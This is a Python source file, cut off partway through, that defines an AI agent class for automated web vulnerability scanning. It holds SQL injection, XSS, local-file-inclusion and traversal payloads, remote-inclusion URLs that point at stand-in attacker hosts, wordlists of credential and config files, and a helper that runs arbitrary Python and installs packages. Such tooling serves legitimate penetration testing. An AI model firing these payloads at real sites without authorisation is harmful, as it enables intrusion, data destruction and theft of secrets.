"""
Web Hacking Agent - Specialized agent for web application security testing.
"""

import asyncio
import json
import re
import subprocess
import urllib.parse
from typing import Any, Dict, List, Optional

from agno.agent import Agent


class WebHackingAgent(Agent):
    """
    Specialized agent for web application security testing and exploitation.
    Focuses on web-specific vulnerabilities and attack vectors.
    """

    def __init__(self):
        super().__init__(
            name="web_hacking_agent",
            description="Advanced web application security testing with Python execution and browser automation",
            instructions="""
            You are the web hacking agent responsible for:
            1. Comprehensive web vulnerability assessment
            2. Dynamic exploit development using Python code execution
            3. Interactive web exploitation using browser automation
            4. Advanced authentication bypass and session management testing
            """,
        )

        self.playwright_mcp_available = False
        self.mcp_server_manager = None

        self.vulnerability_payloads = {
            "sql_injection": [
                "'",
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' #",
                "' UNION SELECT 1,2,3--",
                "'; DROP TABLE users--",
                "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
            ],
            "lfi": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "php://filter/read=convert.base64-encode/resource=index.php",
            ],
            "directory_traversal": [
                "../",
                "..\\",
                "....//",
                "....\\\\",
                "%2e%2e%2f",
                "%2e%2e%5c",
                "%252e%252e%252f",
            ],
        }

        self.common_files = [
            "robots.txt",
            "sitemap.xml",
            ".htaccess",
            "web.config",
            "config.php",
            "database.php",
            "wp-config.php",
            ".env",
            "admin.php",
            "login.php",
            "index.php",
            "backup.sql",
        ]

        self.discovered_vulnerabilities = []
        self.session_data = {}

    async def comprehensive_web_assessment(
        self, target: str, port: int = 80, ssl: bool = False
    ) -> Dict:
        """
        Perform comprehensive web application security assessment with prioritization.

        Args:
            target: Target IP or hostname
            port: Web service port
            ssl: Whether to use HTTPS

        Returns:
            Comprehensive assessment results with prioritized vulnerabilities
        """
        from datetime import datetime

        protocol = "https" if ssl else "http"
        base_url = f"{protocol}://{target}:{port}"

        print(f"🌐 Starting prioritized web assessment of {base_url}")

        priority_order = [
            "sql_injection",  # Highest priority - can lead to data breach
            "authentication",  # Authentication bypass is critical
            "file_inclusion",  # File inclusion can lead to RCE
            "xss",  # XSS for client-side attacks
            "session",  # Session management issues
            "information_leak",  # Information disclosure
        ]

        results = {
            "target": base_url,
            "timestamp": datetime.now().isoformat(),
            "reconnaissance": {},
            "vulnerabilities": {},
            "prioritized_findings": [],
            "authentication_tests": {},
            "session_tests": {},
            "file_tests": {},
            "injection_tests": {},
            "overall_risk": "low",
            "risk_score": 0,
            "exploitation_recommendations": [],
        }

        print("🔍 Phase 1: Web Reconnaissance")
        recon_results = await self._web_reconnaissance(base_url)
        results["reconnaissance"] = recon_results

        print("🎯 Phase 2: Prioritized Vulnerability Testing")

        for i, vuln_type in enumerate(priority_order, 1):
            print(f"  Priority {i}: Testing {vuln_type}")

            if vuln_type == "sql_injection":
                sql_result = await self.sql_injection_testing(base_url)
                results["vulnerabilities"]["sql_injection"] = sql_result
                if sql_result.get("vulnerable", False):
                    results["prioritized_findings"].append(
                        {
                            "type": "sql_injection",
                            "severity": "critical",
                            "priority": 1,
                            "details": sql_result,
                            "impact": "Data breach, unauthorized access to database",
                            "exploitation_difficulty": "medium",
                        }
                    )
                    results["risk_score"] += 40

            elif vuln_type == "authentication":
                auth_result = await self.authentication_bypass_testing(base_url)
                results["vulnerabilities"]["authentication"] = auth_result
                results["authentication_tests"] = auth_result
                if auth_result.get("vulnerable", False):
                    results["prioritized_findings"].append(
                        {
                            "type": "authentication",
                            "severity": "critical",
                            "priority": 2,
                            "details": auth_result,
                            "impact": "Unauthorized access to user accounts",
                            "exploitation_difficulty": "low",
                        }
                    )
                    results["risk_score"] += 35

            elif vuln_type == "file_inclusion":
                file_result = await self.file_inclusion_testing(base_url)
                results["vulnerabilities"]["file_inclusion"] = file_result
                results["file_tests"]["file_inclusion"] = file_result
                if file_result.get("vulnerable", False):
                    results["prioritized_findings"].append(
                        {
                            "type": "file_inclusion",
                            "severity": "high",
                            "priority": 3,
                            "details": file_result,
                            "impact": "Remote code execution, file system access",
                            "exploitation_difficulty": "medium",
                        }
                    )
                    results["risk_score"] += 30

            elif vuln_type == "xss":
                xss_result = await self.xss_testing(base_url)
                results["vulnerabilities"]["xss"] = xss_result
                results["injection_tests"]["xss"] = xss_result
                if xss_result.get("vulnerable", False):
                    results["prioritized_findings"].append(
                        {
                            "type": "xss",
                            "severity": "medium",
                            "priority": 4,
                            "details": xss_result,
                            "impact": "Client-side attacks, session hijacking",
                            "exploitation_difficulty": "low",
                        }
                    )
                    results["risk_score"] += 20

            elif vuln_type == "session":
                session_result = await self._session_testing(base_url)
                results["vulnerabilities"]["session"] = session_result
                results["session_tests"] = session_result
                if session_result.get("vulnerable", False):
                    results["prioritized_findings"].append(
                        {
                            "type": "session",
                            "severity": "medium",
                            "priority": 5,
                            "details": session_result,
                            "impact": "Session hijacking, unauthorized access",
                            "exploitation_difficulty": "medium",
                        }
                    )
                    results["risk_score"] += 15

        # Additional SQL injection testing for injection_tests
        if "sql_injection" not in results["injection_tests"]:
            sql_result = await self.sql_injection_testing(base_url)
            results["injection_tests"]["sql_injection"] = sql_result

        results["prioritized_findings"].sort(key=lambda x: x["priority"])

        # Calculate overall risk assessment
        print("📊 Phase 3: Risk Assessment")
        risk_assessment = self._assess_overall_risk(results["vulnerabilities"])
        if isinstance(risk_assessment, str):
            results["overall_risk"] = risk_assessment
            results["risk_assessment"] = {"overall_risk": risk_assessment}
        else:
            results["overall_risk"] = risk_assessment.get("overall_risk", "low")
            results["risk_assessment"] = risk_assessment

        results[
            "exploitation_recommendations"
        ] = self._generate_exploitation_recommendations(results["prioritized_findings"])

        print(f"✅ Assessment complete. Risk Score: {results['risk_score']}/100")
        print(
            f"🎯 Found {len(results['prioritized_findings'])} prioritized vulnerabilities"
        )

        return results

    async def install_package(self, package_name: str) -> Dict:
        """
        Install Python package for web vulnerability analysis.
        """
        try:
            process = await asyncio.create_subprocess_exec(
                "pip",
                "install",
                package_name,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=60)

            return {
                "success": process.returncode == 0,
                "output": stdout.decode(),
                "error": stderr.decode(),
                "package": package_name,
            }

        except Exception as e:
            return {"success": False, "error": str(e), "package": package_name}

    async def execute_python_exploit(
        self,
        code: str,
        target_url: str,
        timeout: int = 30,
        packages: Optional[List[str]] = None,
    ) -> Dict:
        """
        Execute Python code for dynamic exploit development.
        Runs in subprocess with timeout for security.
        Automatically installs required packages for web vulnerability analysis.
        """
        try:
            if packages:
                for package in packages:
                    install_result = await self.install_package(package)
                    if not install_result["success"]:
                        return {
                            "success": False,
                            "error": f'Failed to install {package}: {install_result["error"]}',
                        }

            exec_script = f"""
import requests
import json
import re
import urllib.parse
import base64
import sys
import subprocess

try:
    from bs4 import BeautifulSoup
except ImportError:
    subprocess.run(['pip', 'install', 'beautifulsoup4'], check=True)
    from bs4 import BeautifulSoup

try:
    import selenium
    from selenium import webdriver
except ImportError:
    pass

try:
    import sqlparse
except ImportError:
    pass

target_url = "{target_url}"

{code}
"""

            process = await asyncio.create_subprocess_exec(
                "python3",
                "-c",
                exec_script,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            try:
                stdout, stderr = await asyncio.wait_for(
                    process.communicate(), timeout=timeout
                )

                return {
                    "success": process.returncode == 0,
                    "output": stdout.decode(),
                    "error": stderr.decode(),
                    "return_code": process.returncode,
                }

            except asyncio.TimeoutError:
                process.kill()
                await process.wait()
                return {
                    "success": False,
                    "error": f"Execution timeout after {timeout} seconds",
                }

        except Exception as e:
            return {"success": False, "error": str(e)}

    async def sql_injection_testing(
        self, target_url: str, parameters: Optional[List[str]] = None
    ) -> Dict:
        """
        Perform comprehensive SQL injection testing.

        Args:
            target_url: URL to test
            parameters: List of parameters to test

        Returns:
            SQL injection test results
        """
        print(f"💉 Testing SQL injection on {target_url}")

        results = {
            "target": target_url,
            "vulnerable_parameters": [],
            "injection_types": [],
            "exploitation_results": [],
            "recommendations": [],
        }

        if not parameters:
            parameters = await self._discover_parameters(target_url)

        for param in parameters:
            for payload in self.vulnerability_payloads["sql_injection"]:
                test_result = await self._test_sql_injection(target_url, param, payload)

                if test_result.get("vulnerable"):
                    results["vulnerable_parameters"].append(
                        {
                            "parameter": param,
                            "payload": payload,
                            "evidence": test_result.get("evidence", ""),
                        }
                    )

                    exploit_result = await self._exploit_sql_injection(
                        target_url, param, payload
                    )
                    if exploit_result.get("success"):
                        results["exploitation_results"].append(exploit_result)

        if results["vulnerable_parameters"]:
            results["injection_types"] = self._classify_sql_injection_types(
                results["vulnerable_parameters"]
            )
            results["recommendations"] = self._generate_sql_recommendations(results)

        return results

    async def xss_testing(
        self, target_url: str, parameters: Optional[List[str]] = None
    ) -> Dict:
        """
        Perform Cross-Site Scripting (XSS) testing.

        Args:
            target_url: URL to test
            parameters: List of parameters to test

        Returns:
            XSS test results
        """
        print(f"🔥 Testing XSS on {target_url}")

        results = {
            "target": target_url,
            "vulnerable_parameters": [],
            "xss_types": [],
            "payloads_successful": [],
            "recommendations": [],
        }

        if not parameters:
            parameters = await self._discover_parameters(target_url)

        for param in parameters:
            for payload in self.vulnerability_payloads["xss"]:
                test_result = await self._test_xss(target_url, param, payload)

                if test_result.get("vulnerable"):
                    results["vulnerable_parameters"].append(
                        {
                            "parameter": param,
                            "payload": payload,
                            "type": test_result.get("xss_type", "reflected"),
                        }
                    )

                    results["payloads_successful"].append(payload)

        if results["vulnerable_parameters"]:
            results["xss_types"] = list(
                set([vuln["type"] for vuln in results["vulnerable_parameters"]])
            )
            results["recommendations"] = self._generate_xss_recommendations(results)

        return results

    async def file_inclusion_testing(self, target_url: str) -> Dict:
        """
        Test for Local and Remote File Inclusion vulnerabilities.

        Args:
            target_url: URL to test

        Returns:
            File inclusion test results
        """
        print(f"📁 Testing file inclusion on {target_url}")

        results = {
            "target": target_url,
            "lfi_vulnerabilities": [],
            "rfi_vulnerabilities": [],
            "sensitive_files": [],
            "recommendations": [],
        }

        lfi_results = await self._test_lfi(target_url)
        results["lfi_vulnerabilities"] = lfi_results

        rfi_results = await self._test_rfi(target_url)
        results["rfi_vulnerabilities"] = rfi_results

        sensitive_results = await self._test_sensitive_files(target_url)
        results["sensitive_files"] = sensitive_results

        if any(
            [
                results["lfi_vulnerabilities"],
                results["rfi_vulnerabilities"],
                results["sensitive_files"],
            ]
        ):
            results["recommendations"] = self._generate_file_inclusion_recommendations(
                results
            )

        return results

    async def authentication_bypass_testing(self, login_url: str) -> Dict:
        """
        Test for authentication bypass vulnerabilities.

        Args:
            login_url: Login page URL

        Returns:
            Authentication bypass test results
        """
        print(f"🔐 Testing authentication bypass on {login_url}")

        results = {
            "target": login_url,
            "bypass_attempts": [],
            "successful_bypasses": [],
            "weak_credentials": [],
            "recommendations": [],
        }

        sql_bypass = await self._test_sql_auth_bypass(login_url)
        results["bypass_attempts"].append(sql_bypass)
        if sql_bypass.get("success"):
            results["successful_bypasses"].append(sql_bypass)

        default_creds = await self._test_default_credentials(login_url)
        results["bypass_attempts"].append(default_creds)
        if default_creds.get("success"):
            results["weak_credentials"].extend(
                default_creds.get("successful_credentials", [])
            )

        session_fixation = await self._test_session_fixation(login_url)
        results["bypass_attempts"].append(session_fixation)
        if session_fixation.get("success"):
            results["successful_bypasses"].append(session_fixation)

        if results["successful_bypasses"] or results["weak_credentials"]:
            results["recommendations"] = self._generate_auth_recommendations(results)

        return results

    async def _web_reconnaissance(self, base_url: str) -> Dict:
        """Perform web reconnaissance."""
        recon = {
            "server_info": {},
            "technologies": [],
            "directories": [],
            "files": [],
            "forms": [],
        }

        server_info = await self._identify_server(base_url)
        recon["server_info"] = server_info

        technologies = await self._detect_web_technologies(base_url)
        recon["technologies"] = technologies

        directories = await self._enumerate_web_directories(base_url)
        recon["directories"] = directories

        files = await self._discover_web_files(base_url)
        recon["files"] = files

        forms = await self._discover_forms(base_url)
        recon["forms"] = forms

        return recon

    async def _vulnerability_testing(self, base_url: str) -> List[Dict]:
        """Test for common web vulnerabilities."""
        vulnerabilities = []

        common_vulns = await self._test_common_vulnerabilities(base_url)
        vulnerabilities.extend(common_vulns)

        return vulnerabilities

    async def _authentication_testing(self, base_url: str) -> Dict:
        """Test authentication mechanisms."""
        auth_tests = {"login_pages": [], "bypass_attempts": [], "credential_tests": []}

        login_pages = await self._find_login_pages(base_url)
        auth_tests["login_pages"] = login_pages

        for login_page in login_pages:
            bypass_result = await self.authentication_bypass_testing(login_page)
            auth_tests["bypass_attempts"].append(bypass_result)

        return auth_tests

    async def _session_testing(self, base_url: str) -> Dict:
        """Test session management."""
        session_tests = {
            "session_fixation": False,
            "session_hijacking": False,
            "csrf_protection": True,
            "secure_cookies": True,
        }

        session_result = await self._test_session_management(base_url)
        session_tests.update(session_result)

        return session_tests

    async def _file_testing(self, base_url: str) -> Dict:
        """Test file-related vulnerabilities."""
        file_tests = {
            "file_upload": {},
            "file_inclusion": {},
            "directory_traversal": {},
        }

        lfi_result = await self.file_inclusion_testing(base_url)
        file_tests["file_inclusion"] = lfi_result

        return file_tests

    async def _injection_testing(self, base_url: str) -> Dict:
        """Test injection vulnerabilities."""
        injection_tests = {"sql_injection": {}, "xss": {}, "command_injection": {}}

        sql_result = await self.sql_injection_testing(base_url)
        injection_tests["sql_injection"] = sql_result

        xss_result = await self.xss_testing(base_url)
        injection_tests["xss"] = xss_result

        return injection_tests

    async def _discover_parameters(self, url: str) -> List[str]:
        """Discover parameters in the URL or forms."""
        parameters = []

        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.query:
            query_params = urllib.parse.parse_qs(parsed_url.query)
            parameters.extend(query_params.keys())

        common_params = [
            "id",
            "page",
            "file",
            "user",
            "search",
            "q",
            "category",
            "action",
        ]
        parameters.extend(common_params)

        return list(set(parameters))

    async def _test_sql_injection(self, url: str, parameter: str, payload: str) -> Dict:
        """Test for SQL injection vulnerability."""
        try:
            if "?" in url:
                test_url = f"{url}&{parameter}={urllib.parse.quote(payload)}"
            else:
                test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"

            cmd = ["curl", "-s", "--connect-timeout", "10", test_url]
            process = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await process.communicate()

            if process.returncode == 0:
                response = stdout.decode()

                sql_errors = [
                    "sql syntax",
                    "mysql_fetch",
                    "ora-",
                    "microsoft ole db",
                    "odbc",
                    "sqlite",
                    "postgresql",
                    "warning: mysql",
                ]

                for error in sql_errors:
                    if error in response.lower():
                        return {
                            "vulnerable": True,
                            "parameter": parameter,
                            "payload": payload,
                            "evidence": f"SQL error detected: {error}",
                        }

            return {"vulnerable": False}

        except Exception as e:
            return {"vulnerable": False, "error": str(e)}

    async def _test_xss(self, url: str, parameter: str, payload: str) -> Dict:
        """Test for XSS vulnerability."""
        try:
            if "?" in url:
                test_url = f"{url}&{parameter}={urllib.parse.quote(payload)}"
            else:
                test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"

            cmd = ["curl", "-s", "--connect-timeout", "10", test_url]
            process = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await process.communicate()

            if process.returncode == 0:
                response = stdout.decode()

                if payload in response:
                    return {
                        "vulnerable": True,
                        "parameter": parameter,
                        "payload": payload,
                        "xss_type": "reflected",
                    }

            return {"vulnerable": False}

        except Exception as e:
            return {"vulnerable": False, "error": str(e)}

    async def _test_lfi(self, url: str) -> List[Dict]:
        """Test for Local File Inclusion."""
        lfi_results = []

        for payload in self.vulnerability_payloads["lfi"]:
            try:
                test_url = f"{url}?file={urllib.parse.quote(payload)}"

                cmd = ["curl", "-s", "--connect-timeout", "10", test_url]
                process = await asyncio.create_subprocess_exec(
                    *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )

                stdout, stderr = await process.communicate()

                if process.returncode == 0:
                    response = stdout.decode()

                    if any(
                        indicator in response
                        for indicator in ["root:", "bin:", "daemon:", "[boot loader]"]
                    ):
                        lfi_results.append(
                            {
                                "payload": payload,
                                "evidence": "System file contents detected",
                                "vulnerable": True,
                            }
                        )

            except Exception as e:
                continue

        return lfi_results

    async def _test_rfi(self, url: str) -> List[Dict]:
        """Test for Remote File Inclusion."""
        rfi_results = []

        rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://pastebin.com/raw/malicious",
            "ftp://attacker.com/backdoor.php",
            "http://127.0.0.1/malicious.txt",
            "//evil.com/shell.txt",
        ]

        rfi_parameters = [
            "file",
            "page",
            "include",
            "path",
            "template",
            "doc",
            "content",
        ]

        for param in rfi_parameters:
            for payload in rfi_payloads:
                try:
                    if "?" in url:
                        test_url = f"{url}&{param}={urllib.parse.quote(payload)}"
                    else:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"

                    rfi_test_code = f"""
import requests
import json

try:
    response = requests.get(target_url, timeout=10, allow_redirects=False)
    
    rfi_indicators = [
        'failed to open stream',
        'no such file or directory',
        'permission denied',
        'include_path',
        'fopen',
        'file_get_contents',
        'curl error',
        'connection refused',
        'network unreachable'
    ]
    
    content = response.text.lower()
    status_code = response.status_code
    
    for indicator in rfi_indicators:
        if indicator in content:
            result = {{
                "vulnerable": True,
                "parameter": "{param}",
                "payload": "{payload}",
                "indicator": indicator,
                "status_code": status_code,
                "rfi_type": "error_based"
            }}
            print(json.dumps(result))
            exit()
    
    if status_code == 200 and len(content) > 0:
        success_indicators = ['<?php', '<script>', 'eval(', 'system(', 'exec(']
        for indicator in success_indicators:
            if indicator in content:
                result = {{
                    "vulnerable": True,
                    "parameter": "{param}",
                    "payload": "{payload}",
                    "indicator": f"Successful inclusion detected: {{indicator}}",
                    "status_code": status_code,
                    "rfi_type": "successful_inclusion"
                }}
                print(json.dumps(result))
                exit()
    
    result = {{"vulnerable": False}}
    print(json.dumps(result))
    
except Exception as e:
    result = {{"vulnerable": False, "error": str(e)}}
    print(json.dumps(result))
"""

                    result = await self.execute_python_exploit(rfi_test_code, test_url)

                    if result.get("success") and result.get("output"):
                        try:
                            test_result = json.loads(result["output"].strip())
                            if test_result.get("vulnerable"):
                                rfi_results.append(test_result)
                        except json.JSONDecodeError:
                            continue

                except Exception as e:
                    continue

        return rfi_results

    async def _test_sensitive_files(self, url: str) -> List[Dict]:
        """Test for access to sensitive files."""
        sensitive_results = []

        for filename in self.common_files:
            try:
                file_url = f"{url.rstrip('/')}/{filename}"

                cmd = ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", file_url]
                process = await asyncio.create_subprocess_exec(
                    *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )

                stdout, stderr = await process.communicate()

                if process.returncode == 0:
                    status_code = stdout.decode().strip()
                    if status_code == "200":
                        sensitive_results.append(
                            {"file": filename, "url": file_url, "accessible": True}
                        )

            except Exception as e:
                continue

        return sensitive_results

    async def _identify_server(self, url: str) -> Dict:
        """Identify web server information."""
        try:
            cmd = ["curl", "-I", "-s", "--connect-timeout", "10", url]
            process = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await process.communicate()

            if process.returncode == 0:
                headers = stdout.decode()
                server_info = {}

                for line in headers.split("\n"):
                    if ":" in line:
                        key, value = line.split(":", 1)
                        server_info[key.strip().lower()] = value.strip()

                return server_info

            return {}

        except Exception as e:
            return {"error": str(e)}

    def _assess_overall_risk(self, results: Dict) -> str:
        """Assess overall risk level based on findings."""
        high_risk_indicators = 0
        medium_risk_indicators = 0

        vulnerabilities = results.get("vulnerabilities", [])
        high_risk_indicators += len(vulnerabilities)

        injection_tests = results.get("injection_tests", {})
        if injection_tests.get("sql_injection", {}).get("vulnerable_parameters"):
            high_risk_indicators += 2
        if injection_tests.get("xss", {}).get("vulnerable_parameters"):
            high_risk_indicators += 1

        auth_tests = results.get("authentication_tests", {})
        for test in auth_tests.get("bypass_attempts", []):
            if test.get("successful_bypasses"):
                high_risk_indicators += 2

        file_tests = results.get("file_tests", {})
        if file_tests.get("file_inclusion", {}).get("lfi_vulnerabilities"):
            high_risk_indicators += 1

        if high_risk_indicators >= 3:
            return "critical"
        elif high_risk_indicators >= 1:
            return "high"
        elif medium_risk_indicators >= 2:
            return "medium"
        else:
            return "low"

    async def _exploit_sql_injection(
        self, url: str, parameter: str, payload: str
    ) -> Dict:
        """Attempt to exploit SQL injection."""
        return {"success": False, "reason": "Exploitation not implemented"}

    def _classify_sql_injection_types(self, vulnerable_params: List[Dict]) -> List[str]:
        """Classify types of SQL injection found."""
        return ["error-based", "blind"]

    def _generate_sql_recommendations(self, results: Dict) -> List[str]:
        """Generate SQL injection remediation recommendations."""
        return [
            "Use parameterized queries/prepared statements",
            "Implement input validation and sanitization",
            "Apply principle of least privilege to database accounts",
            "Enable database logging and monitoring",
        ]

    def _generate_xss_recommendations(self, results: Dict) -> List[str]:
        """Generate XSS remediation recommendations."""
        return [
            "Implement proper output encoding",
            "Use Content Security Policy (CSP)",
            "Validate and sanitize all user inputs",
            "Use secure coding practices for dynamic content",
        ]

    def _generate_file_inclusion_recommendations(self, results: Dict) -> List[str]:
        """Generate file inclusion remediation recommendations."""
        return [
            "Implement strict input validation",
            "Use whitelist approach for file access",
            "Disable dangerous PHP functions if applicable",
            "Implement proper access controls",
        ]

    def _generate_auth_recommendations(self, results: Dict) -> List[str]:
        """Generate authentication remediation recommendations."""
        return [
            "Implement strong password policies",
            "Use multi-factor authentication",
            "Implement account lockout mechanisms",
            "Use secure session management",
        ]

    async def _detect_web_technologies(self, url: str) -> List[str]:
        """Detect web technologies using headers and content analysis."""
        try:
            tech_detection_code = f"""
import requests
import re
import json

try:
    response = requests.get(target_url, timeout=10, allow_redirects=True)
    technologies = []
    
    headers = response.headers
    if 'server' in headers:
        technologies.append(f"Server: {{headers['server']}}")
    if 'x-powered-by' in headers:
        technologies.append(f"Powered-by: {{headers['x-powered-by']}}")
    if 'x-aspnet-version' in headers:
        technologies.append(f"ASP.NET: {{headers['x-aspnet-version']}}")
    if 'x-generator' in headers:
        technologies.append(f"Generator: {{headers['x-generator']}}")
    
    # Check content for common frameworks and technologies
    content = response.text.lower()
    
    if 'wordpress' in content or 'wp-content' in content or 'wp-includes' in content:
        technologies.append('WordPress')
    if 'drupal' in content or '/sites/default/' in content:
        technologies.append('Drupal')
    if 'joomla' in content or 'joomla!' in content:
        technologies.append('Joomla')
    
    if 'react' in content or 'reactjs' in content or '_react' in content:
        technologies.append('React')
    if 'angular' in content or 'ng-' in content:
        technologies.append('Angular')
    if 'vue' in content or 'vuejs' in content or 'vue.js' in content:
        technologies.append('Vue.js')
    if 'jquery' in content:
        technologies.append('jQuery')
    
    # Backend Technologies
    if 'php' in content or '<?php' in content:
        technologies.append('PHP')
    if 'asp.net' in content or 'aspnet' in content:
        technologies.append('ASP.NET')
    if 'jsp' in content or 'jsessionid' in content:
        technologies.append('JSP/Java')
    if 'django' in content or 'csrfmiddlewaretoken' in content:
        technologies.append('Django')
    if 'flask' in content:
        technologies.append('Flask')
    if 'rails' in content or 'ruby' in content:
        technologies.append('Ruby on Rails')
    
    if 'apache' in headers.get('server', '').lower():
        technologies.append('Apache')
    if 'nginx' in headers.get('server', '').lower():
        technologies.append('Nginx')
    if 'iis' in headers.get('server', '').lower():
        technologies.append('IIS')
    
    if 'mysql' in content:
        technologies.append('MySQL')
    if 'postgresql' in content or 'postgres' in content:
        technologies.append('PostgreSQL')
    if 'mongodb' in content or 'mongo' in content:
        technologies.append('MongoDB')
    
    print(json.dumps(technologies))
    
except Exception as e:
    print(json.dumps([f"Error: {{str(e)}}"]))
"""

            result = await self.execute_python_exploit(tech_detection_code, url)
            if result.get("success") and result.get("output"):
                try:
                    return json.loads(result["output"].strip())
                except json.JSONDecodeError:
                    return []
            return []

        except Exception as e:
            return [f"Detection failed: {str(e)}"]

    async def _enumerate_web_directories(self, url: str) -> List[str]:
        """Enumerate web directories using common directory wordlist."""
        try:
            common_dirs = [
                "admin",
                "administrator",
                "login",
                "wp-admin",
                "wp-content",
                "wp-includes",
                "uploads",
                "images",
                "css",
                "js",
                "javascript",
                "assets",
                "static",
                "backup",
                "backups",
                "old",
                "tmp",
                "temp",
                "test",
                "dev",
                "development",
                "config",
                "configuration",
                "settings",
                "include",
                "includes",
                "lib",
                "libraries",
                "vendor",
                "node_modules",
                "api",
                "v1",
                "v2",
                "rest",
                "phpmyadmin",
                "phpinfo",
                "info",
                "status",
                "health",
                "debug",
                "logs",
                "log",
                "error",
                "errors",
                "access",
                "private",
                "secret",
                "hidden",
                "internal",
                "management",
                "control",
                "panel",
                "dashboard",
            ]

            dir_enum_code = f"""
import requests
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

base_url = target_url.rstrip('/')
directories = {common_dirs}
found_dirs = []
lock = threading.Lock()

def check_directory(directory):
    try:
        dir_url = f"{{base_url}}/{{directory}}/"
        response = requests.get(dir_url, timeout=5, allow_redirects=False)
        
        if response.status_code in [200, 301, 302, 403, 401]:
            with lock:
                found_dirs.append({{
                    "directory": directory,
                    "url": dir_url,
                    "status_code": response.status_code,
                    "accessible": response.status_code == 200
                }})
    except:
        pass

# Use ThreadPoolExecutor for concurrent requests
with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(check_directory, directory) for directory in directories]
    for future in as_completed(futures):
        future.result()

print(json.dumps(found_dirs))
"""

            result = await self.execute_python_exploit(
                dir_enum_code, url, packages=["requests"]
            )
            if result.get("success") and result.get("output"):
                try:
                    found_dirs = json.loads(result["output"].strip())
                    return [
                        f"{d['directory']} ({d['status_code']})" for d in found_dirs
                    ]
                except json.JSONDecodeError:
                    return []
            return []

        except Exception as e:
            return [f"Directory enumeration failed: {str(e)}"]

    async def _discover_web_files(self, url: str) -> List[str]:
        """Discover common web files and sensitive files."""
        try:
            common_files = [
                "robots.txt",
                "sitemap.xml",
                "crossdomain.xml",
                "clientaccesspolicy.xml",
                "favicon.ico",
                "humans.txt",
                "security.txt",
                ".well-known/security.txt",
                "phpinfo.php",
                "info.php",
                "test.php",
                "config.php",
                "database.php",
                "wp-config.php",
                "wp-config.php.bak",
                "config.inc.php",
                "settings.php",
                "web.config",
                "app.config",
                "appsettings.json",
                "package.json",
                ".env",
                ".env.local",
                ".env.production",
                ".htaccess",
                ".htpasswd",
                "readme.txt",
                "README.md",
                "CHANGELOG.md",
                "LICENSE",
                "VERSION",
                "backup.sql",
                "database.sql",
                "dump.sql",
                "backup.zip",
                "backup.tar.gz",
                "admin.php",
                "login.php",
                "auth.php",
                "user.php",
                "users.php",
                "index.php~",
                "index.html~",
                "index.bak",
                "backup.php",
                "error_log",
                "access.log",
                "debug.log",
                "application.log",
            ]

            file_discovery_code = f"""
import requests
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

base_url = target_url.rstrip('/')
files = {common_files}
found_files = []
lock = threading.Lock()

def check_file(filename):
    try:
        file_url = f"{{base_url}}/{{filename}}"
        response = requests.get(file_url, timeout=5, allow_redirects=False)
        
        if response.status_code in [200, 403]:
            content_length = len(response.content) if response.status_code == 200 else 0
            with lock:
                found_files.append({{
                    "file": filename,
                    "url": file_url,
                    "status_code": response.status_code,
                    "size": content_length,
                    "accessible": response.status_code == 200
                }})
    except:
        pass

# Use ThreadPoolExecutor for concurrent requests
with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(check_file, filename) for filename in files]
    for future in as_completed(futures):
        future.result()

print(json.dumps(found_files))
"""

            result = await self.execute_python_exploit(
                file_discovery_code, url, packages=["requests"]
            )
            if result.get("success") and result.get("output"):
                try:
                    found_files = json.loads(result["output"].strip())
                    return [
                        f"{f['file']} ({f['status_code']}, {f['size']} bytes)"
                        for f in found_files
                    ]
                except json.JSONDecodeError:
                    return []
            return []

        except Exception as e:
            return [f"File discovery failed: {str(e)}"]

    async def _discover_forms(self, url: str) -> List[Dict]:
        """Discover forms on the website for vulnerability testing."""
        try:
            form_discovery_code = f"""
import requests
from bs4 import BeautifulSoup
import json

try:
    response = requests.get(target_url, timeout=10)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    forms = []
    for form in soup.find_all('form'):
        form_data = {{
            'action': form.get('action', ''),
            'method': form.get('method', 'GET').upper(),
            'inputs': [],
            'has_file_upload': False,
            'potential_vulnerabilities': []
        }}
        
        for input_field in form.find_all(['input', 'textarea', 'select']):
            input_data = {{
                'name': input_field.get('name', ''),
                'type': input_field.get('type', 'text'),
                'value': input_field.get('value', ''),
                'required': input_field.has_attr('required')
            }}
            form_data['inputs'].append(input_data)
            
            if input_field.get('type') == 'file':
                form_data['has_file_upload'] = True
                form_data['potential_vulnerabilities'].append('File Upload')
        
        # Analyze form for potential vulnerabilities
        if form_data['method'] == 'GET':
            form_data['potential_vulnerabilities'].append('GET-based form (XSS/SQLi risk)')
        
        input_names = [inp['name'].lower() for inp in form_data['inputs']]
        if any(name in ['username', 'user', 'email', 'login'] for name in input_names) and \
           any(name in ['password', 'pass', 'pwd'] for name in input_names):
            form_data['potential_vulnerabilities'].append('Login Form (Auth Bypass)')
        
        if any(name in ['search', 'query', 'q', 'keyword'] for name in input_names):
